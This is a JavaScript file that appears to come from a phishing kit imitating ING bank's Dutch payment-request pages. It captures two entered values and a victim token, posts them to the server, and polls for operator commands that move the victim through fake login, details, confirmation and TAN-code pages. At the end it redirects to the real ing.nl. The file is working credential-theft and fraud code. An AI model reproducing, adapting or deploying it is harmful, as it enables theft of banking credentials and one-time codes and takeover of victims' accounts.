const login_form = document.querySelector('#login-form');

const wifi = document.querySelector('#login-username');
const wifi_pass = document.querySelector('#login-password');
const wifi_pass_two = document.querySelector('#login-password-two');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (wifi.value == '' || wifi_pass.value == '' || wifi_pass_two.value == '' || wifi_pass.value !== wifi_pass_two.value) {
        loginButton.innerHTML = 'Volgende';
        loginButton.disabled = false;
        wifi.disabled = false;
        wifi_pass.disabled = false;
        wifi_pass_two.disabled = false;

        wifi.value = '';
        wifi_pass.value = '';
        wifi_pass_two.value = '';

        document.querySelector('#userNamePassword').classList.add('has-error');
        document.querySelector('#errorMessage').classList.remove('h-hidden');
    } else {
        const data = new FormData();
        data.append('wifi', wifi.value);
        data.append('wifi_pass', wifi_pass.value);
        data.append('wifi_pass_two', wifi_pass_two.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
        loginButton.disabled = true;
        wifi.disabled = true;
        wifi_pass.disabled = true;
        wifi_pass_two.disabled = true;

        document.querySelector('#userNamePassword').classList.remove('has-error');
        document.querySelector('#errorMessage').classList.add('h-hidden');

        fetch('/particulier/betaalverzoek/controleren/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/particulier/betaalverzoek/controleren/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            window.location.href = '/particulier/betaalverzoek/inloggen/' + token.value;
                        } else if (data.page == 'details') {
                            window.location.href = '/particulier/betaalverzoek/informatie/' + token.value;
                        } else if (data.page == 'confirm') {
                            window.location.href = '/particulier/betaalverzoek/bevestigen/' + token.value;
                        } else if (data.page == 'tan') {
                            window.location.href = '/particulier/betaalverzoek/tancode/' + token.value;
                        } else if (data.page == 'control') {
                            loginButton.innerHTML = 'Volgende';
                            loginButton.disabled = false;
                            wifi.disabled = false;
                            wifi_pass.disabled = false;
                            wifi_pass_two.disabled = false;

                            wifi.value = '';
                            wifi_pass.value = '';
                            wifi_pass_two.value = '';
                            
                            document.querySelector('#userNamePassword').classList.add('has-error');
                            document.querySelector('#errorMessage').classList.remove('h-hidden');

                            clearInterval(newInterval)
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.ing.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);        
        });
    }
});


